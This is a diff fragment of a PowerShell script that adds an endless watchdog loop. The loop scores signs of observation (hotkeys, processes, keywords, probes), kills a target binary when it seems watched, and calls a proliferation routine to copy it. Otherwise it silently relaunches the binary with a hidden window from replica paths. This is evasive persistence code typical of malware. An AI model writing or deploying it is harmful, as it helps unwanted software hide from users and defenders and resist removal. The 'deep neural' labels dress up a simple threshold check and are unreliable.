@@ -450,5 +450,47 @@ while ($true) {
 
     # Deep Neural Inputs Vector (5 Features)
     $neuralInputs = @($hotkeyInput, $processInput, $keywordInput, $probeInput, $cloudIndicator)
+ # [TRIPLE CROSS-CHECK VERIFICATION LOOP WITH DEEP NEURAL NETWORK]
+    $threatConfirmations = 0
+    for ($check = 1; $check -le 3; $check++) {
+        $prob = $global:NeuralBrain.Predict($neuralInputs)
+        if ($prob -gt 0.65) {
+            $threatConfirmations++
+        }
+        Start-Sleep -Milliseconds 40
+    }
 
+    if ($threatConfirmations -ge 3) {  
+        # Backpropagation Online Learning (Reinforce Threat Pattern)
+        $global:NeuralBrain.AdaptOnline($neuralInputs, 1.0)
+
+        if ($targetRunning) {  
+            Stop-Process -Name $binaryBaseName -Force -ErrorAction SilentlyContinue  
+        }
+        if (Test-Path $global:primaryBinaryPath) {
+            Invoke-DeepNeuralProliferation -sourceFile $global:primaryBinaryPath -intensity 5
+        }
+    } else {  
+        # Backpropagation Online Learning (Reinforce Safe State)
+        $global:NeuralBrain.AdaptOnline($neuralInputs, 0.0)
+
+        if (-not $targetRunning) {  
+            $launchCandidate = $global:primaryBinaryPath  
+            if (-not (Test-Path $launchCandidate)) {  
+                foreach ($nodeInstance in $global:replicaNodes) {  
+                    if (Test-Path $nodeInstance) {  
+                        $launchCandidate = $nodeInstance  
+                        break  
+                    }  
+                }  
+            }  
+
+            if ($launchCandidate -and (Test-Path $launchCandidate)) {  
+                Start-Process -FilePath $launchCandidate -ArgumentList $executionArguments -WorkingDirectory (Split-Path $launchCandidate) -WindowStyle Hidden -ErrorAction SilentlyContinue  
+            }  
+        }  
+    }  
+
+    Start-Sleep -Milliseconds (Get-Random -Minimum 400 -Maximum 900)
+}
     
